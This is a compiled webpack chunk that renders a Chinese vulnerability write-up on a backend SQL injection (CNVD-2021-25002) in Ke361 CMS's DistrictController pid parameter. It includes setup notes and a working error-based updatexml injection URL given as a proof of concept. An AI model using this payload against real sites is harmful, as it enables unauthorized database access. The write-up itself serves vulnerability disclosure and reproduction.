(window.webpackJsonp=window.webpackJsonp||[]).push([[194],{1124:function(t,s,a){t.exports=a.p+"assets/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35-20220313232910449.b730640f.png"},1125:function(t,s,a){t.exports=a.p+"assets/img/1634142045802-bdf21a65-a663-4f35-afc2-bc3e70d44309.ac892eba.png"},1126:function(t,s,a){t.exports=a.p+"assets/img/1634142062147-5e1703bb-91c6-44cd-8867-c3409540c2d8.9e847b2a.png"},2988:function(t,s,a){"use strict";a.r(s);var r=a(64),e=Object(r.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"ke361-districtcontroller-class-php-后台sql注入漏洞-cnvd-2021-25002"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ke361-districtcontroller-class-php-后台sql注入漏洞-cnvd-2021-25002"}},[t._v("#")]),t._v(" Ke361 DistrictController.class.php 后台SQL注入漏洞 CNVD-2021-25002")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("Ke361 DistrictController.class.php index() 函数 pid参数存在 SQL注入漏洞，通过漏洞可以获取数据库敏感信息")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("Ke361")]),s("br"),t._v(" "),s("h2",{attrs:{id:"环境搭建"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("https://gitee.com/jcove/ke361")]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("CMS产品页面")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1124),alt:"img"}})]),t._v(" "),s("p",[t._v("存在漏洞的文件为 "),s("code",[t._v("Application/Admin/Controller/DistrictController.class.php")])]),t._v(" "),s("p",[s("img",{attrs:{src:a(1125),alt:"img"}})]),t._v(" "),s("p",[t._v("验证POC")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[t._v("admin"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("District"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("pid"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("AND"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("updatexml"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("concat")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("md5"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1126),alt:"img"}})]),t._v(" "),s("p",[t._v("若有收获，就点个赞吧")])],1)}),[],!1,null,null,null);s.default=e.exports}}]);